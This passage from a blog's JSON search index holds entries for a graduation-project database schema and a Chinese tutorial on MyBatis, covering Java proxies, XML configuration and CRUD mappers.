1aij​=1,则R为传递关系。","categories":[{"name":"离散数学","slug":"离散数学","permalink":"http://enderxiao.github.io/categories/%E7%A6%BB%E6%95%A3%E6%95%B0%E5%AD%A6/"},{"name":"研究生入学考试","slug":"研究生入学考试","permalink":"http://enderxiao.github.io/categories/%E7%A0%94%E7%A9%B6%E7%94%9F%E5%85%A5%E5%AD%A6%E8%80%83%E8%AF%95/"},{"name":"复试","slug":"研究生入学考试/复试","permalink":"http://enderxiao.github.io/categories/%E7%A0%94%E7%A9%B6%E7%94%9F%E5%85%A5%E5%AD%A6%E8%80%83%E8%AF%95/%E5%A4%8D%E8%AF%95/"}],"tags":[{"name":"离散数学","slug":"离散数学","permalink":"http://enderxiao.github.io/tags/%E7%A6%BB%E6%95%A3%E6%95%B0%E5%AD%A6/"},{"name":"二元关系","slug":"二元关系","permalink":"http://enderxiao.github.io/tags/%E4%BA%8C%E5%85%83%E5%85%B3%E7%B3%BB/"},{"name":"笛卡尔积","slug":"笛卡尔积","permalink":"http://enderxiao.github.io/tags/%E7%AC%9B%E5%8D%A1%E5%B0%94%E7%A7%AF/"}]},{"title":"毕业设计","slug":"毕业设计","date":"2021-02-25T09:53:14.000Z","updated":"2024-07-30T11:26:33.936Z","comments":true,"path":"2021/02/25/毕业设计/","permalink":"http://enderxiao.github.io/2021/02/25/%E6%AF%95%E4%B8%9A%E8%AE%BE%E8%AE%A1/","excerpt":"","text":"毕业设计 数据字典 college 字段名 数据类型 键 长度 备注 不是null college_id int 主键 自增 √ college_name varchar 40 学院名，唯一 √ college_student_num int 学院总人数 major 字段名 数据类型 键 长度 备注 不是null major_id int 主键 自增 √ major_name varchar 40 专业名，唯一 √ major_student_num int 专业人数 college_id int 外键（college） 学院名 √ classes 字段名 数据类型 键 长度 备注 不是null classes_id int 主键 自增 √ major_id int 外键（major） 所属专业 √ school_year int 学年 √ classes_name int 班级名（1，2，3…） √ user 字段名 数据类型 键 长度 备注 不是null u_id int 主键 学生学号 √ username varchar 20 学生姓名 √ password char 6 必须为6位数字 √ class_id int 外键（classes表） 班级id √ virtualCard 字段名 数据类型 键 长度 备注 不是null vc_id int 主键 自增 √ u_id int 外键（user） 用户id √ rest_money int 卡内剩余金额数 √ card_status byte 0表示未激活，1表示激活 √ creat_time datetime 创建时间 √ last_edit_time datetime 最后一次更新时间 √ vc_password char 6 校园卡支付密码 √ store 字段名 数据类型 键 长度 备注 不是null store_id int 主键 自增 √ store_name varchar 40 商铺名，唯一 √ create_time datetime 创建时间 √ consumption 字段名 数据类型 键 长度 备注 不是null csp_id int 主键 自增 √ csp_money int 消费金额 √ store_id int 外键（store） 消费地点id √ csp_time datetime 消费时间 √ u_id int 外键（user） 消费用户 √ csp_status byte 0表示出账，1表示入账 √ grade 字段名 数据类型 键 长度 备注 不是null grade_id int 主键 自增 √ u_id int 外键（user） 成绩所属学生 √ grade_sum varchar 总成绩 √ daily_grade varchar 10 平时成绩 exam_grade varchar 10 考试成绩 exam_type varchar 10 测试类型 √ grade_name varchar 40 课程名 √ classRoom 字段名 数据类型 键 长度 备注 不是null class_room_id int 主键 自增 √ class_room_no int 教室编号 √ class_building varchar 40 所属教学楼 √ area_name varchar 10 校区 √ course 字段名 数据类型 键 长度 备注 不是null course_id int 主键 自增 √ course_name varchar 30 课程名 √ classes_id int 外键（classes） 上课班级 √ week_no int 1-25 上课周次 √ week_day int 1~7 课程在周几 √ course_no int 1~8 第几节课 √ class_room_id int 外键（classRoom） 上课教室 √","categories":[{"name":"本科","slug":"本科","permalink":"http://enderxiao.github.io/categories/%E6%9C%AC%E7%A7%91/"},{"name":"毕业设计","slug":"本科/毕业设计","permalink":"http://enderxiao.github.io/categories/%E6%9C%AC%E7%A7%91/%E6%AF%95%E4%B8%9A%E8%AE%BE%E8%AE%A1/"}],"tags":[{"name":"毕业设计","slug":"毕业设计","permalink":"http://enderxiao.github.io/tags/%E6%AF%95%E4%B8%9A%E8%AE%BE%E8%AE%A1/"},{"name":"微信小程序","slug":"微信小程序","permalink":"http://enderxiao.github.io/tags/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F/"},{"name":"本科","slug":"本科","permalink":"http://enderxiao.github.io/tags/%E6%9C%AC%E7%A7%91/"},{"name":"虚拟校园","slug":"虚拟校园","permalink":"http://enderxiao.github.io/tags/%E8%99%9A%E6%8B%9F%E6%A0%A1%E5%9B%AD/"}]},{"title":"mybatis入门","slug":"mybatis入门","date":"2021-02-08T07:34:18.000Z","updated":"2024-07-30T11:26:33.918Z","comments":true,"path":"2021/02/08/mybatis入门/","permalink":"http://enderxiao.github.io/2021/02/08/mybatis%E5%85%A5%E9%97%A8/","excerpt":"java工具——持久层工具mybatis","text":"java工具——持久层工具mybatis mybatis简介 以下引用自百度https://baike.baidu.com/item/MyBatis/2824918?fr=aladdin MyBatis 本是apache的一个开源项目iBatis, 2010年这个项目由apache software foundation 迁移到了google code，并且改名为MyBatis 。2013年11月迁移到Github。 iBATIS一词来源于“internet”和“abatis”的组合，是一个基于Java的持久层框架。iBATIS提供的持久层框架包括SQL Maps和Data Access Objects（DAOs） mybatis作用 以下引用自百度https://baike.baidu.com/item/MyBatis/2824918?fr=aladdin MyBatis 是一款优秀的持久层框架，它支持定制化 SQL、存储过程以及高级映射。 MyBatis 避免了几乎所有的 JDBC 代码和手动设置参数以及获取结果集。 MyBatis 可以使用简单的 XML 或注解来配置和映射原生信息，将接口和 Java 的 POJOs(Plain Ordinary Java Object,普通的 Java对象)映射成数据库中的记录。 持久化 将程序数据在持久状态和瞬间状态之间转化的机制，最好的例子就是将内存中的数据保存到磁盘就是一个持久化的过程 我们的程序在运行时说的持久化通常就是指将内存数据存在硬盘，比如保存在数据库文件、xml文件中 持久层 java中所说的持久层，大体上指将业务中操作数据库的代码统一抽离出来，形成了位于业务层和数据库之间的独立的层 常见的解决方案有： JDBC EJB JDO mybatis优点和缺点 sql语句与代码分离，存放在xml配置文件中 优点：便于维护管理，不用在java代码中找这些语句，使项目能更好的符合开闭原则 缺点：JDBC方式可以用打断点的方式调试，但是mybatis不能，需要通过log4j日志输出日志信息帮助调试，然后再配置文件中修改 用逻辑标签控制动态SQL的拼接 优点：用标签代替写逻辑代码 缺点：拼接复杂SQL语句时，没有代码灵活，拼写比较复杂。 查询的结果集与java对象自动映射 优点：保证名称相同，配置好映射关系即可自动映射，或者，不配置映射关系，通过配置列名 = 字段名也可以完成自动映射 缺点：对开发人员缩写的SQL依赖很强 编写原生SQL 接近JDBC，比较灵活 对SQL语句依赖程度很高；并且属于半自动，数据库移植比较麻烦，比如mysql数据库变成Oracle数据库，部分sql语句需要调整 代理设计模式 代理模式分为： 静态代理 动态代理 代理的核心功能是方法增强 静态代理 角色分析 抽象角色：一般使用接口或者抽象类来实现 真实角色：被代理的角色 代理角色：代理真实角色；代理真实角色后，一般会做一些附属的操作 客户：使用代理角色来进行一些操作 例子 写一个接口 123456public interface Singer &#123; /** * 歌手都能唱歌 */ public void sing();&#125; 男歌手 123456789101112public class MaleSinger implements Singer&#123; private String name; public MaleSinger(String name) &#123; this.name = name; &#125; @Override public void sing()&#123; System.out.println(this.name+&quot;开始唱歌了&quot;); &#125;&#125; 经纪人 123456789101112131415public class Agent implements Singer&#123; private Singer singer; public Agent(Singer singer) &#123; this.singer = singer; &#125; @Override public void sing() &#123; System.out.println(&quot;和节目组谈好价格，曲目，场地....&quot;); singer.sing(); System.out.println(&quot;结算费用&quot;); &#125;&#125; 客户 1234567public class Client &#123; public static void main(String[] args) &#123; Singer singer = new MaleSinger(&quot;Bob.M&quot;); Singer agent = new Agent(singer); agent.sing(); &#125;&#125; 这个过程中我们直接接触的是经纪人，经济人在演出前后做了一些复杂的事情 优点 虽然整个演出的过程复杂了，但是歌手类并没有改变 公共的统一问题都交给了代理完成 公共业务进行拓展或变更时，可以更为方便 符合开闭原则、单一原则 缺点 每个类都写个代理，重复工作较多，比较麻烦 动态代理 动态代理的角色和静态代理的一样 动态代理的代理类是动态生成的，静态代理中的代理是我们自己创建的 动态代理分为两类： 基于接口的动态代理——JDK动态代理 基于类的动态代理——cglib 现在用的比较多的是javasist来生成动态代理 JDK动态代理 核心：invocationHandler和Proxy，打开JDK帮助文档可查看 【invocationHandler：调用处理程序】 12345Object invoke(Object proxy,Method method, Object[] args);//参数//proxy -调用该方法的代理实列//method - 所描述方法对应于调用代理实列上的接口方法的实列。方法对象的声明类将是该方法声明的接口，它可以是代理类继承该方法的代理接口的超级接口//args -包含的方法调用传递代理实列的参数值的对象的阵列，或null如果接口方法没有参数。原始类型的参数包含在适当的原始包装器类的实列中，例如java.lang.Integer或java.lang.Boolean. 【proxy：代理】 1234567//生成代理类public Object getProxy()&#123; return Proxy.new ProxyInstance(this.getClass().getClassLoader(), rent.getClass().getInterface(),this);&#125;/**参数： * 类加载器，接口数组，innovationHandler */ 例子： 1234567891011121314151617181920212223public class Client &#123; public static void main(String[] args) &#123; Singer singer = new MaleSinger(&quot;Bob.M&quot;); Singer agent = (Singer) Proxy.newProxyInstance(Client.class.getClassLoader(), singer.getClass().getInterfaces(), new InvocationHandler() &#123; @Override public Object invoke(Object proxy, Method method, Object[] args) throws Throwable &#123; System.out.println(&quot;节目组找过了，需要演出，谈好费用...&quot;); Object invoke = method.invoke(singer, args); System.out.println(&quot;结算费用，下一次合作预约...&quot;); return invoke; &#125; &#125;); //此处匿名内部类InvocationHandler也可以使用lambda表达式: // Singer agent = (Singer) Proxy.newProxyInstance(Client.class.getClassLoader(), singer.getClass().getInterfaces(), (proxy, method, args1) -&gt; &#123; // System.out.println(&quot;节目组找过了，需要演出，谈好费用...&quot;); // Object invoke = method.invoke(singer, args1); // System.out.println(&quot;结算费用，下一次合作预约...&quot;); // return invoke; // &#125;); agent.sing(); &#125;&#125; Proxy会利用java发反射机制，自动的为你的项目中创建一个代理类，使用如下语句，生成的动态代理，就会在编译后的文件中显示 123System.getProperties().put(&quot;sun.misc.ProxyGenerator.saveGeneratedFiles&quot;,true);//jdk1.8可以使用//然而在新版本中使用该方法仍然无法显示，通过查找包中ProxyGenerator类的路径得知，新版本需要如下设置System.getProperties().put(&quot;jdk.proxy.ProxyGenerator.saveGeneratedFiles&quot;,&quot;true&quot;);//jdk11可以使用 原因在此： 关于如何获取动态创建的代理的问题https://blog.csdn.net/zyq8514700/article/details/99892329 Singer代理产生类： 1234567891011121314151617181920212223public class Agent implements InvocationHandler &#123; private Object object; public Agent(Object object) &#123; this.object = object; &#125; @Override public Object invoke(Object proxy, Method method, Object[] args) throws Throwable &#123; System.out.println(&quot;节目组找过了，需要演出，谈好费用...&quot;); Object invoke = method.invoke(object, args); System.out.println(&quot;结算费用，下一次合作预约...&quot;); return invoke; &#125; public static Object getProxy(Singer singer)&#123; Agent agent = new Agent(singer); return Proxy.newProxyInstance(Agent.class.getClassLoader(),singer.getClass().getInterfaces(),agent); &#125;&#125; 123456789101112131415public class Client &#123; public static void main(String[] args) &#123; System.getProperties().put(&quot;jdk.proxy.ProxyGenerator.saveGeneratedFiles&quot;,&quot;true&quot;); Singer singer = new MaleSinger(&quot;Bob.M&quot;); Singer agent = (Singer) Agent.getProxy(singer); agent.sing(); Singer singer1 = new MaleSinger(&quot;Bob.D&quot;); Singer agent1 = (Singer) Agent.getProxy(singer1); agent1.sing(); &#125;&#125; 万能代理： 123456789101112131415161718public class Agent implements InvocationHandler &#123; @Override public Object invoke(Object proxy, Method method, Object[] args) throws Throwable &#123; System.out.println(&quot;打开资源&quot;); System.out.println(method.getName()); if(args != null)&#123; System.out.println(args[0].getClass().getSimpleName()); &#125; System.out.println(&quot;关闭资源&quot;); return null; &#125; public static &lt;T&gt;T getProxy(Class&lt;T&gt; target)&#123; Agent agent = new Agent(); Object o = Proxy.newProxyInstance(Agent.class.getClassLoader(), new Class[]&#123;target&#125;, agent);//new 一个该类型的接口 return (T)o; &#125;&#125; 123456789101112public class Client &#123; public static void main(String[] args) &#123; System.getProperties().put(&quot;jdk.proxy.ProxyGenerator.saveGeneratedFiles&quot;,&quot;true&quot;); Singer proxy = Agent.getProxy(Singer.class); proxy.sing(); IUserDao proxy1 = Agent.getProxy(IUserDao.class); proxy1.saveUser(&quot;Ender&quot;); &#125;&#125; 搭建环境 建立数据库 123456789DROP TABLE IF EXISTS `user`;CREATE TABLE `user` (`id` INT(20) NOT NULL,`username` VARCHAR(30) DEFAULT NULL,`password` VARCHAR(30) DEFAULT NULL,PRIMARY KEY (`id`)) ENGINE=INNODB DEFAULT CHARSET=utf8;INSERT into `user`(`id`,`username`,`password`)VALUE (1,&#x27;张三&#x27;,&#x27;123456&#x27;),(2,&#x27;李四&#x27;,&#x27;abcdef&#x27;),(3,&#x27;王五&#x27;,&#x27;987654&#x27;); 编写实体类 此处用到lombok插件，可使用注释的方式在编译时生成构造函数，toString等方法 123456789101112/** * @author Ender-PC * @date 2021/2/2 */@Data@AllArgsConstructor@NoArgsConstructorpublic class User implements Serializable &#123; private int id; private String username; private String password;&#125; Maven配置 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.projectlombok&lt;/groupId&gt; &lt;artifactId&gt;lombok&lt;/artifactId&gt; &lt;version&gt;1.18.8&lt;/version&gt; &lt;/dependency&gt; &lt;!--单元测试--&gt; &lt;dependency&gt; &lt;groupId&gt;junit&lt;/groupId&gt; &lt;artifactId&gt;junit&lt;/artifactId&gt; &lt;version&gt;3.8.2&lt;/version&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;!--mybatis 核心--&gt; &lt;dependency&gt; &lt;groupId&gt;org.mybatis&lt;/groupId&gt; &lt;artifactId&gt;mybatis&lt;/artifactId&gt; &lt;version&gt;3.5.6&lt;/version&gt; &lt;/dependency&gt; &lt;!--数据库驱动--&gt; &lt;dependency&gt; &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt; &lt;version&gt;8.0.23&lt;/version&gt; &lt;/dependency&gt;&lt;/dependencies&gt;&lt;!--单元测试--&gt;&lt;build&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt; &lt;artifactId&gt;maven-compiler-plugin&lt;/artifactId&gt; &lt;version&gt;3.1&lt;/version&gt; &lt;configuration&gt; &lt;source&gt;11&lt;/source&gt; &lt;target&gt;11&lt;/target&gt; &lt;encoding&gt;utf-8&lt;/encoding&gt; &lt;/configuration&gt; &lt;/plugin&gt; &lt;/plugins&gt; &lt;!--防止在java中写的配置文件不被加载到resources文件夹--&gt; &lt;resources&gt; &lt;resource&gt; &lt;directory&gt;src/main/java&lt;/directory&gt; &lt;includes&gt; &lt;include&gt;**/*.properties&lt;/include&gt; &lt;include&gt;**/*.xml&lt;/include&gt; &lt;/includes&gt; &lt;filtering&gt;false&lt;/filtering&gt; &lt;/resource&gt; &lt;resource&gt; &lt;directory&gt;src/main/resources&lt;/directory&gt; &lt;includes&gt; &lt;include&gt;**/*.properties&lt;/include&gt; &lt;include&gt;**/*.xml&lt;/include&gt; &lt;/includes&gt; &lt;filtering&gt;false&lt;/filtering&gt; &lt;/resource&gt; &lt;/resources&gt;&lt;/build&gt; Mybatis核心配置文件 mybatis-config.xml 12345678910111213141516171819202122232425&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;&lt;!--对xml的约束--&gt;&lt;!DOCTYPE configuration PUBLIC &quot;-//mybatis.org//DTD Config 1.0//EN&quot; &quot;http://mybatis.org/schema/mybatis-3-config.dtd&quot;&gt;&lt;configuration&gt; &lt;!--环境--&gt; &lt;environments default=&quot;development&quot;&gt; &lt;environment id=&quot;development&quot;&gt; &lt;!--事物管理器--&gt; &lt;transactionManager type=&quot;JDBC&quot;/&gt; &lt;!--数据源--&gt; &lt;dataSource type=&quot;POOLED&quot;&gt; &lt;property name=&quot;driver&quot; value=&quot;com.mysql.cj.jdbc.Driver&quot;/&gt; &lt;property name=&quot;url&quot; value=&quot;jdbc:mysql://localhost:3306/ssm?useSSL=true&amp;amp;useUnicode=true&amp;amp;characterEncoding=utf8&quot;/&gt; &lt;property name=&quot;username&quot; value=&quot;root&quot;/&gt; &lt;property name=&quot;password&quot; value=&quot;root&quot;/&gt; &lt;/dataSource&gt; &lt;/environment&gt; &lt;/environments&gt; &lt;mappers&gt; &lt;mapper resource=&quot;mappers/UserMapper.xml&quot;/&gt; &lt;/mappers&gt;&lt;/configuration&gt; 实列对应的xml，在该文件中，可以直接添加sql语句来进行查询 12345678910&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;&lt;!--对xml的约束--&gt;&lt;!DOCTYPE mapper PUBLIC &quot;-//mybatis.org//DTD Mapper 3.0//EN&quot; &quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;&gt;&lt;mapper namespace=&quot;com.ender.dao.UserMapper&quot;&gt; &lt;select id=&quot;selectUsers&quot; resultType=&quot;com.ender.entity.User&quot;&gt; select id,username,password from user &lt;/select&gt;&lt;/mapper&gt; DAO层接口 1234567891011121314151617/** * @author Ender-PC */public interface UserMapper &#123; /** * 查询所有用户信息 * @return */ List&lt;User&gt; selectUsers(); /** * 根据id查找用户 * @param id * @return */ User selectUserById(int id);&#125; 测试 此处使用junit中的before和after将数据库的开关分离处理 123456789101112131415161718192021222324252627282930313233343536/** * @author Ender-PC * @date 2021/2/2 */public class TestUser &#123; private SqlSession session; @Before public void before()&#123; try &#123; String resource = &quot;mybatis-config.xml&quot;; InputStream inputStream = Resources.getResourceAsStream(resource); SqlSessionFactory sqlSessionFactory = new SqlSessionFactoryBuilder().build(inputStream); session = sqlSessionFactory.openSession(); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; &#125; @Test public void testSelectUsers()&#123; //使用代理调用dao UserMapper mapper = session.getMapper(UserMapper.class); List&lt;User&gt; users = mapper.selectUsers(); for (User user : users) &#123; System.out.println(user); &#125; &#125; @After public void after()&#123; session.commit(); session.close(); &#125;&#125; CRUD select 在接口中添加方法的声明: 12345678public interface UserMapper &#123; /** * 根据id查找用户 * @param id * @return */ User selectUserById(int id);&#125; 在UserMapper.xml中添加select语句 123&lt;select id=&quot;selectUserById&quot; resultType=&quot;com.ender.entity.User&quot;&gt; select id,username,password from user where id = #&#123;id&#125;&lt;/select&gt; 其中： resultType：指定了返回值类型 parameterType：参数类型（具有自动映射自动转化的过程） id：指定对应的方法 #{id}：sql中的变量，要保证大括号中的变量必须在User对象里有 #{}：占位符，其实就是PreparedStatement处理这个变量 #{}与${}的区别 #{}的主要作用就是替换预编译语句{PreparedStatement}中的占位符, ?[推荐使用] 12INSERT INTO user (name) VALUE (#&#123;name&#125;);INSERT INTO user (name) VALUE (?); ${}的作用是直接进行字符串替换 12INSERT INTO user (name) VALUE (&#x27;$&#123;name&#125;&#x27;);INSERT INTO user (name) VALUE (&#x27;赵六&#x27;); insert 1234567891011/** * @author Ender-PC */public interface UserMapper &#123; /** * 保存用户信息 * @param user * @return */ int saveUser(User user);&#125; 123&lt;insert id=&quot;saveUser&quot; parameterType=&quot;com.ender.entity.User&quot;&gt; insert into user (username,password) value (#&#123;username&#125;,#&#123;password&#125;)&lt;/insert&gt; update 1234567891011/** * @author Ender-PC */public interface UserMapper &#123; /** * 更新用户信息 * @param user * @return */ int updateUser(User user);&#125; 123&lt;update id=&quot;updateUser&quot; parameterType=&quot;com.ender.entity.User&quot;&gt; update user set username = #&#123;username&#125; , password = #&#123;password&#125; where id = #&#123;id&#125;&lt;/update&gt; delete 1234567891011/** * @author Ender-PC */public interface UserMapper &#123; /** * 根据id删除一个用户记录 * @param id * @return */ int deleteUser(int id);&#125; 123&lt;delete id=&quot;deleteUser&quot; parameterType=&quot;java.lang.Integer&quot;&gt; delete from user where id = #&#123;id&#125;&lt;/delete&gt; 操作注释 通常不推荐使用注释的方法，因为要保证代码遵循开闭原则，如果使用注释操作，今后修改时就需要修改源代码，违反了开闭原则 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566/** * @author Ender-PC * @date 2021/2/2 */public class TestAdmin &#123; private SqlSession session; @Before public void before()&#123; try &#123; String resource = &quot;mybatis-config.xml&quot;; InputStream inputStream = Resources.getResourceAsStream(resource); SqlSessionFactory sqlSessionFactory = new SqlSessionFactoryBuilder().build(inputStream); session = sqlSessionFactory.openSession(); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; &#125; @Test public void testSelectAdmins()&#123; //使用代理调用dao AdminMapper mapper = session.getMapper(AdminMapper.class); List&lt;Admin&gt; admins = mapper.selectAdmins(); for (Admin admin : admins) &#123; System.out.println(admin); &#125; &#125; @Test public void testSelectAdminsById()&#123; AdminMapper mapper = session.getMapper(AdminMapper.class); Admin admin = mapper.selectAdminById(1); System.out.println(admin); &#125; @Test public void testSaveAdmin()&#123; AdminMapper mapper = session.getMapper(AdminMapper.class); Admin admin = new Admin(4, &quot;赵六&quot;, &quot;123&quot;); int rows = mapper.saveAdmin(admin); System.out.println(rows); &#125; @Test public void testUpdateAdmin()&#123; AdminMapper mapper = session.getMapper(AdminMapper.class); Admin admin = new Admin(4, &quot;赵六2&quot;, &quot;dsjioa123&quot;); int rows = mapper.updateAdmin(admin); System.out.println(rows); &#125; @Test public void testDeleteAdmin()&#123; AdminMapper mapper = session.getMapper(AdminMapper.class); int rows = mapper.deleteAdmin(4); System.out.println(rows); &#125; @After public void after()&#123; session.commit(); session.close(); &#125;&#125; 注册时需要选择类进行注册 123&lt;mappers&gt; &lt;mapper class=&quot;com.ender.dao.AdminMapper&quot;/&gt;&lt;/mappers&gt; 模糊查找 Java代码中拼接字符串 1234string name = &quot;%IT%&quot;;//对于带有索引的字段，建议使用如下形式//string name = &quot;IT%&quot;;list&lt;name&gt; names = mapper.getUserByName(name); 123&lt;select id = &quot;getUserByName&quot;&gt; select * from user where name like #&#123;name&#125;&lt;/select&gt; 在配置文件中拼接 12string name = &quot;IT&quot;;list&lt;name&gt; names = mapper.getUserByName(name); 1234&lt;select id=&quot;&quot;&gt; select * from user where name like &quot;%&quot;#&#123;name&#125;&quot;%&quot;&lt;/select&gt;&lt;!--此处必须用双引号--&gt; map的使用 map可以代替任何的实体类，所以当我们数据比较复杂时，可以适当考虑使用map来完成相关工作 配置文件 123&lt;select id=&quot;getUserByParams&quot; resultType=&quot;map&quot; &gt; select id,username,password from user where username = #&#123;name&#125;&lt;/select&gt; 方法 123456/** * 根据一些参数查询 * @param map * @return */List&lt;User&gt; getUsersByParams(Map&lt;String,String&gt; map); 测试 12345678910@Testpublic void findByParams()&#123; UserMapper mapper = session.getMapper(UserMapper.class); Map&lt;String,String&gt; map = new HashMap&lt;String,String&gt;(); map.put(&quot;name&quot;,&quot;郑七&quot;); Lisr&lt;User&gt; users = mapper.getUsersByparams(map); for(User user: users)&#123; System.out.println(user.getUsername()); &#125;&#125; 多个参数 对于单个参数的方法来说，mybatis将自动将参数对应到sql语句中，但若参数包含多个，可以使用如下方式 1234567/*** 通过字符串添加记录* @param username* @param password* @return*/int saveAdmin(@Param(&quot;username&quot;) String username,@Param(&quot;password&quot;) String password); 123&lt;select id=&quot;&quot;&gt;insert into admin (username,password) values (#&#123;username&#125;,#&#123;password&#125;)&lt;/select&gt; 使用多参数时，需要使用注释表明对应关系，其次还可以使用一个map传参，mybatis将通过key、value来处理关系 别名 内置别名 mybatis内置别名： Alias Mapped Type _byte byte _long long _short short _int int _integer int _double double _float float _boolean boolean string String byte Byte long Long short Short int Integer integer Integer double Double float Float boolean Boolean date Date decimal BigDecimal bigdecimal BigDecimal object Obkect map Map hashmap HashMap list List arraylist ArrayList collection Collection iterator Iterator 自定义别名 在核心配置文件中加入 123&lt;typeAliases&gt;&lt;typeAlias type=&quot;com.ender.entity.User&quot; alias=&quot;user&quot;/&gt;&lt;/typeAliases&gt; &lt;typeAliases&gt;标签需要在&lt;enviroment&gt;之前，基本顺序为：&lt;properties&gt;、&lt;settings&gt;、typeAlias、typeHandlers、、、、&lt;environment&gt; &lt;typeAlias&gt;标签中有type和alice两个属性 type填写实体类的全类名，alias可以不填，不填默认为类名，不区分大小写，alias有值时以其中的值为准 123&lt;typeAliases&gt; &lt;package name=&quot;com.ender.entity&quot; /&gt;&lt;/typeAliases&gt; &lt;package&gt;标签为某个包下所有类起别名；name属性填写包名。包名默认是类名，不区分大小写 1@Alias() 注解 加在实体类上，为某个类起别名：例如`@Alias(&quot;User&quot;)` mybatis配置文件 mybatis的配置文件分为： 核心配置文件 mapper配置文件 核心配置文件 mybatis-config.xml系统核心配置文件 核心配置文件主要配置mybatis一些基础组件和加载资源，核心配置文件中的元素常常能影响mybatis的整个运行过程 能配置的内容如下，顺序不能乱： 1234567891011121. properties是一个配置属性的元素2. settings设置，mybatis最为复杂的配置也是最重要的，会改变mybatis运行时候的行为3. typeAliases别名（在Type AliasRegistry中可以看到mybatis提供了许多的系统别名）4. typeHandlers 类型处理器（比如在预处理语句中设置一个参数或者从结果集中获取一个参数的时候，都会用到类型处理器，在TypeHandlerRegistry中定义了很多的类型处理器）5. objectFactory 对象工厂 （mybatis在构建一个和结构或返回的时候，会使用一个objectFactory去构建pojo）6. plugins 插件7. environments 环境变量 1. environment 环境变量 1. transactionManager 事务管理器 2. dataSource 数据源 3. databaseIdProvider 数据库厂商标识8. mappers 映射器 environments元素 为mybatis配置多环境运行，将SQL映射到多个不同的数据库上，必须指定其中一个为默认运行环境（通过default指定），如果想切换环境修改default的值即可 最常见的就是，生产环境和开发环境，两个环境切换必将导致数据库的切换 1234567891011121314151617181920212223242526272829&lt;environments default=&quot;development&quot;&gt; &lt;environment id=&quot;development&quot;&gt; &lt;!--事物管理器--&gt; &lt;transactionManager type=&quot;JDBC&quot;&gt; &lt;property name=&quot;...&quot; value=&quot;...&quot;/&gt; &lt;/transactionManager&gt; &lt;!--数据源--&gt; &lt;dataSource type=&quot;POOLED&quot;&gt; &lt;property name=&quot;driver&quot; value=&quot;$&#123;driver&#125;&quot;/&gt; &lt;property name=&quot;url&quot; value=&quot;$&#123;url&#125;&quot;/&gt; &lt;property name=&quot;username&quot; value=&quot;$&#123;username&#125;&quot;/&gt; &lt;property name=&quot;password&quot; value=&quot;$&#123;password&#125;&quot;/&gt; &lt;/dataSource&gt; &lt;/environment&gt; &lt;environment id=&quot;product&quot;&gt; &lt;!--事物管理器--&gt; &lt;transactionManager type=&quot;JDBC&quot;&gt; &lt;property name=&quot;...&quot; value=&quot;...&quot;/&gt; &lt;/transactionManager&gt; &lt;!--数据源--&gt; &lt;dataSource type=&quot;POOLED&quot;&gt; &lt;property name=&quot;driver&quot; value=&quot;$&#123;driver&#125;&quot;/&gt; &lt;property name=&quot;url&quot; value=&quot;$&#123;url&#125;&quot;/&gt; &lt;property name=&quot;username&quot; value=&quot;$&#123;username&#125;&quot;/&gt; &lt;property name=&quot;password&quot; value=&quot;$&#123;password&#125;&quot;/&gt; &lt;/dataSource&gt; &lt;/environment&gt;&lt;/environments&gt; dataSource 元素使用标准的JDBC数据源接口来配置JDBC连接对象的资源 数据源是必须配置的 有三种内建的数据源类型 1234type=&quot;[UNPOOKED|POOKED|JNDI]&quot;- unpooked:这个数据源的实现只是每次被请求时打开和关闭连接- pooled:这种数据源的实现利用“池”的概念将JDBC连接对象组织起来，这是一种使得并发Web应用快速响应请求的流行处理方法- jndi:这个数据源实现时为了能在如spring或应用服务器中使用，容器可以集中或在外部配hi数据源，然后放置一个JNDI上下文引用 数据源也有很多第三方的实现，比如druid，dbcp，c3p0等等… 这两种事物管理器类型都不需要设置任何属性 具体的一套环境，通过设置id进行区别，id保证唯一 子元素节点：transactionManager - [事物管理器] 12&lt;!-- 语法 --&gt;&lt;transactionManager type=&quot;[JDBC | MANAGED]&quot; /&gt; 子元素节点：数据源（dataSource） mappers元素 对写好的mapper和xml进行统一管理 引入方式 1234567&lt;mappers&gt;&lt;!-- 使用相对于类路径的资源引用 --&gt;&lt;mapper resource=&quot;com/ender/dao/userMapper.xml&quot;/&gt;&lt;!-- 面向注解时使用全类名 --&gt;&lt;mapper class=&quot;com.ender.dao.AdminMapper&quot;/&gt;&lt;/mappers&gt;&lt;!--等等其他方式--&gt; Mapper文件 123456&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;&lt;!DOCTYPE mapperPUBLIC &quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;&quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;&gt;&lt;mapper namespace=&quot;com.xinzhi.mapper.UserMapper&quot;&gt;&lt;/mapper&gt; namespace：命名空间 namespace的命名必须跟某个接口同名 Properties元素 数据库连接信息我们最好放在一个单独的文件中。 在资源目录下新建一个db.properties 12345driver=com.mysql.jdbc.Driverurl=jdbc:mysql://localhost:3306/ssm?useSSL=true&amp;useUnicode=true&amp;characterEncoding=utf8username=rootpassword=root 导入properties配置文件 123456789101112131415161718&lt;configuration&gt; &lt;!--导入properties文件--&gt; &lt;properties resource=&quot;db.properties&quot;/&gt; &lt;environments default=&quot;development&quot;&gt; &lt;environment id=&quot;development&quot;&gt; &lt;transactionManager type=&quot;JDBC&quot;/&gt; &lt;dataSource type=&quot;POOLED&quot;&gt; &lt;property name=&quot;driver&quot; value=&quot;$&#123;driver&#125;&quot;/&gt; &lt;property name=&quot;url&quot; value=&quot;$&#123;url&#125;&quot;/&gt; &lt;property name=&quot;username&quot; value=&quot;$&#123;username&#125;&quot;/&gt; &lt;property name=&quot;password&quot; value=&quot;$&#123;password&#125;&quot;/&gt; &lt;/dataSource&gt; &lt;/environment&gt; &lt;/environments&gt; 